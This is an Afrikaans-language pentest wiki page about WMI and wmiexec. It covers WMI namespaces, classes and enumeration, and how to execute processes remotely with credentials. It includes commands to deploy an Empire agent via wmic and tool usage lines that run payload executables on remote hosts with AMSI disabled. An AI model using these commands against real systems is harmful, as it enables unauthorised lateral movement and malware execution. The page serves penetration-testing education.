# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## Hoe Dit Werk

Prosesse kan op hosts oopgemaak word wanneer die gebruikersnaam en óf wagwoord óf hash bekend is deur die gebruik van WMI. Commands word met WMI deur Wmiexec uitgevoer, wat ’n semi-interaktiewe shell-ervaring bied.

**dcomexec.py:** Deur verskillende DCOM-endpoints te gebruik, bied hierdie script ’n semi-interaktiewe shell soortgelyk aan wmiexec.py, wat spesifiek die ShellBrowserWindow DCOM-object gebruik. Dit ondersteun tans MMC20. Application-, Shell Windows- en Shell Browser Window-objects. (source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>

## WMI Grondbeginsels

### Naamruimte

WMI se topvlak-container is gestruktureer in ’n gidsstyl-hiërargie en is \root, waaronder addisionele gidse, waarna as namespaces verwys word, georganiseer is.<sup>[[1]](#references)</sup>
Commands om namespaces te lys:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
Klasse binne 'n namespace kan gelys word deur:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **Klasse**

Dit is noodsaaklik vir enige WMI-bewerking om die naam van ’n WMI-klas, soos win32_process, en die namespace waarin dit voorkom, te ken.  
Opdragte om klasse wat met `win32` begin, te lys:
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
Aanroeping van 'n klas:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### Metodes

Metodes, wat een of meer uitvoerbare funksies van WMI-klasse is, kan uitgevoer word.
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI Enumeration

### WMI Diensstatus

Opdragte om te verifieer of die WMI-diens operasioneel is:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### Stelsel- en prosesinligting

Versameling van stelsel- en prosesinligting deur WMI:
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
Vir aanvallers is WMI ’n kragtige hulpmiddel om sensitiewe data oor stelsels of domains te enumeriseer.<sup>[[1]](#references)</sup>
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
Afstandnavrae van WMI vir spesifieke inligting, soos plaaslike administrators of gebruikers wat aangemeld is, is moontlik met sorgvuldige opdragkonstruksie.

### **Handmatige afstandnavrae van WMI**

Stille identifisering van plaaslike administrators op ’n afgeleë masjien en gebruikers wat aangemeld is, kan deur spesifieke WMI-navrae bereik word. `wmic` ondersteun ook lees vanaf ’n tekslêer om opdragte gelyktydig op verskeie nodusse uit te voer.<sup>[[1]](#references)</sup>

Om ’n proses oor WMI op afstand uit te voer, soos om ’n Empire-agent te ontplooi, word die volgende opdragstruktuur gebruik, met suksesvolle uitvoering wat deur ’n terugkeerwaarde van "0" aangedui word:<sup>[[1]](#references)</sup>
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
Hierdie proses illustreer WMI se vermoë vir remote execution en stelselenumerasie, wat die bruikbaarheid daarvan vir beide stelseladministrasie en penetration testing beklemtoon.

## Outomatiese gereedskap

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- Jy kan ook **Impacket se `wmiexec`** gebruik.


## Verwysings

- [1] [Gebruik geloofsbriewe om beheer oor Windows-bokse te verkry - Deel 3 (WMI en WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
- [2] [Beginnersgids tot Impacket Tool Kit - Deel 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)


{{#include ../../banners/hacktricks-training.md}}
